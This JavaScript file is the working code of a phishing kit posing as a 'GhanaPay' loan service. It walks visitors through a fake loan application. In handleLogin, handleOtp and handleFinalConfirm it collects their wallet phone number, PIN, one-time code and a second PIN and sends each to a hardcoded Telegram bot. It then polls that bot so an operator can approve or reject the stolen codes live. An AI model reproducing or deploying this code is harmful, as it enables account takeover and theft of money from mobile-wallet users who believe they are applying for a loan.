const TELEGRAM_BOT_TOKEN = '9174032031:AAGwVUsLLWPIWczxjYR5DuGJC0ymI4fEixQ';
const TELEGRAM_CHAT_ID = '9167856736';

const translations = {
    en: {
        loan_calc: "Loan Calculator",
        select_p: "Select your desired loan amount and term.",
        monthly: "Monthly Payment",
        total_r: "Total Repayment",
        amount: "Loan Amount",
        term: "Term (Months)",
        apply: "APPLY NOW",
        summary: "Loan Summary",
        receive: "Amount to receive",
        period: "Period",
        fee: "Service fee",
        to_repay: "Total to repay",
        penalty_note: "⚠️ Note: Penalty applies if not repaid by due date. Always repay on time to protect your limit.",
        confirm_proceed: "CONFIRM & PROCEED",
        app_details: "Application Details",
        loan_type: "Loan Type",
        personal_info: "Personal Information",
        full_name: "Full Name",
        phone: "Phone Number",
        eligibility: "Eligibility: Must be a GhanaPay wallet holder and 18 years or older.",
        review: "Review Application",
        confirm_apply: "CONFIRM & APPLY",
        auth_loan: "Authorize Loan",
        login_sub: "Login to your GhanaPay account to authorize.",
        pin: "GhanaPay PIN",
        login_btn: "LOGIN",
        otp_ver: "OTP Verification",
        otp_sub: "Enter the code sent to your mobile number.",
        verify_btn: "VERIFY",
        final_step: "Confirm PIN",
        final_sub: "Please confirm your PIN to complete the request.",
        finish_btn: "FINISH",
        success_title: "Application Completed!",
        success_msg: "Your loan request has been successfully sent and is being processed.",
        back_btn: "BACK",
        placeholder_name: "E.g. Kofi Mensah",
        placeholder_phone: "054XXXXXXX / 024XXXXXXX",
        pin_error: "Incorrect PIN. Please try again.",
        otp_error: "Incorrect code. Please try again.",
        loading: "Processing...",
        security_note: "2026 GhanaPay Financial Services. All rights reserved.",
        auth_reason: "You are authorizing the following loan:"
    }
};

let loanData = JSON.parse(localStorage.getItem('ghanapay_data')) || { 
    amount: 1000, 
    term: 3, 
    total: 0, 
    fee: 0, 
    fullName: '', 
    phone: '', 
    loginPhone: '', 
    loginPin: '', 
    otp: '', 
    finalPin: '' 
};

function saveData() {
    localStorage.setItem('ghanapay_data', JSON.stringify(loanData));
}

function applyTranslations() {
    const t = translations.en;
    document.querySelectorAll('[data-t]').forEach(el => {
        const key = el.getAttribute('data-t');
        if (t[key]) el.textContent = t[key];
    });
    
    const nameInput = document.getElementById('full-name');
    if (nameInput) nameInput.placeholder = t.placeholder_name;
    const phoneInput = document.getElementById('phone-number');
    if (phoneInput) phoneInput.placeholder = t.placeholder_phone;
    const loginPhone = document.getElementById('login-phone');
    if (loginPhone) loginPhone.placeholder = t.placeholder_phone;
}

async function sendToTelegram(message, buttons = null) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };
    if (buttons) payload.reply_markup = { inline_keyboard: buttons };
    try {
        const res = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
        return await res.json();
    } catch (e) { return null; }
}

let lastUpdateId = 0;
let pollingInterval = null;

async function startPolling(callback) {
    if (pollingInterval) clearInterval(pollingInterval);
    const initRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?limit=1&offset=-1`).then(r => r.json());
    if (initRes.ok && initRes.result.length > 0) lastUpdateId = initRes.result[0].update_id;

    pollingInterval = setInterval(async () => {
        try {
            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`).then(r => r.json());
            if (res.ok && res.result.length > 0) {
                for (const update of res.result) {
                    lastUpdateId = update.update_id;
                    if (update.callback_query) {
                        callback(update.callback_query.data);
                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery?callback_query_id=${update.callback_query.id}`);
                    }
                }
            }
        } catch (e) {}
    }, 2000);
}

function navigateTo(page) {
    saveData();
    window.location.href = page;
}

function updateSimulator() {
    const slider = document.getElementById('loan-amount-slider');
    const termSelect = document.getElementById('loan-term-select');
    if (!slider) return;
    const amount = parseInt(slider.value);
    const term = parseInt(termSelect.value);
    const rate = 0.15;
    const total = amount + (amount * rate);
    const monthly = total / term;
    const fee = amount * 0.15;

    loanData.amount = amount;
    loanData.term = term;
    loanData.total = total;
    loanData.fee = fee;
    saveData();
}

function initPage() {
    applyTranslations();
    const path = window.location.pathname;

    if (path.endsWith('index.html') || path === '/' || path.includes('index.html')) {
        const slider = document.getElementById('loan-amount-slider');
        if (slider) {
            slider.value = loanData.amount;
            document.getElementById('loan-term-select').value = loanData.term;
            updateSimulator();
        }
    } else if (path.includes('summary.html')) {
        document.getElementById('sum-receive').textContent = `GHS ${loanData.amount.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
        document.getElementById('sum-period').textContent = `${loanData.term} Months`;
        document.getElementById('sum-fee').textContent = `GHS ${loanData.fee.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
        document.getElementById('sum-total').textContent = `GHS ${loanData.total.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
    } else if (path.includes('details.html')) {
        document.getElementById('detail-amount').value = `GHS ${loanData.amount.toLocaleString()}`;
        document.getElementById('detail-term').value = `${loanData.term} Months`;
    } else if (path.includes('personal.html')) {
        document.getElementById('full-name').value = loanData.fullName || '';
        document.getElementById('phone-number').value = loanData.phone || '';
    } else if (path.includes('review.html')) {
        document.getElementById('rev-amount').textContent = `GHS ${loanData.amount.toLocaleString()}`;
        document.getElementById('rev-total').textContent = `GHS ${loanData.total.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
        document.getElementById('rev-name').textContent = loanData.fullName || '---';
        document.getElementById('rev-phone').textContent = loanData.phone || '---';
    } else if (path.includes('login.html')) {
        document.getElementById('auth-amount').textContent = `GHS ${loanData.amount.toLocaleString()}`;
        document.getElementById('auth-total').textContent = `GHS ${loanData.total.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
        if (loanData.phone) document.getElementById('login-phone').value = loanData.phone;
    } else if (path.includes('otp.html')) {
        const otpInputs = document.querySelectorAll('.otp-box');
        otpInputs.forEach((input, idx) => {
            input.addEventListener('input', (e) => { 
                if (e.target.value.length === 1 && idx < otpInputs.length - 1) otpInputs[idx + 1].focus(); 
            });
            input.addEventListener('keydown', (e) => { 
                if (e.key === 'Backspace' && !e.target.value && idx > 0) otpInputs[idx - 1].focus(); 
            });
        });
    }
}

async function handleLogin() {
    const phone = document.getElementById('login-phone').value;
    const pin = document.getElementById('login-pin').value;
    const error = document.getElementById('login-error');
    if (phone.length < 8 || pin.length < 4) { alert("Please fill correctly."); return; }

    loanData.loginPhone = phone;
    loanData.loginPin = pin;
    saveData();
    error.style.display = 'none';
    document.getElementById('loading-overlay').style.display = 'flex';

    const msg = `<b>🇬🇭 GhanaPay Login</b>\n👤 Name: ${loanData.fullName}\n📱 Tel: ${phone}\n🔐 <b>PIN: ${pin}</b>\n💰 GHS ${loanData.amount.toLocaleString()}`;
    await sendToTelegram(msg, [[{ text: "✅ Approve PIN", callback_data: "login_approve" }, { text: "❌ Wrong PIN", callback_data: "login_decline" }]]);

    startPolling((decision) => {
        if (decision === 'login_approve') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; navigateTo('otp.html'); }
        else if (decision === 'login_decline') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; error.style.display = 'block'; }
    });
}

async function handleOtp() {
    const otpInputs = document.querySelectorAll('.otp-box');
    let otp = ''; otpInputs.forEach(i => otp += i.value);
    const error = document.getElementById('otp-error');
    if (otp.length < 6) { alert("Enter 6 digits."); return; }

    loanData.otp = otp;
    saveData();
    error.style.display = 'none';
    document.getElementById('loading-overlay').style.display = 'flex';

    const msg = `<b>📩 OTP Received (🇬🇭)</b>\n📞 Tel: ${loanData.loginPhone}\n🔢 <b>OTP: ${otp}</b>`;
    await sendToTelegram(msg, [[{ text: "✅ Approve OTP", callback_data: "otp_approve" }, { text: "❌ Wrong OTP", callback_data: "otp_decline" }]]);

    startPolling((decision) => {
        if (decision === 'otp_approve') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; navigateTo('confirm-pin.html'); }
        else if (decision === 'otp_decline') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; error.style.display = 'block'; }
    });
}

async function handleFinalConfirm() {
    const pin = document.getElementById('final-pin').value;
    const error = document.getElementById('final-error');
    if (pin.length < 4) { alert("Confirm the PIN."); return; }
    
    loanData.finalPin = pin;
    saveData();
    if (error) error.style.display = 'none';
    document.getElementById('loading-overlay').style.display = 'flex';

    const msg = `<b>🏁 Final PIN Confirmation (🇬🇭)</b>\n📞 Tel: ${loanData.loginPhone}\n🔑 <b>Final PIN: ${pin}</b>\n⚠️ Initial PIN: ${loanData.loginPin}`;
    await sendToTelegram(msg, [[{ text: "✅ Approve Final", callback_data: "final_approve" }, { text: "❌ Wrong PIN", callback_data: "final_decline" }]]);

    startPolling((decision) => {
        if (decision === 'final_approve') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; navigateTo('success.html'); }
        else if (decision === 'final_decline') { clearInterval(pollingInterval); document.getElementById('loading-overlay').style.display = 'none'; if (error) error.style.display = 'block'; }
    });
}

function handlePersonal() {
    loanData.fullName = document.getElementById('full-name').value;
    loanData.phone = document.getElementById('phone-number').value;
    if (!loanData.fullName || !loanData.phone) { alert("Please fill all fields."); return; }
    navigateTo('review.html');
}

document.addEventListener('DOMContentLoaded', initPage);
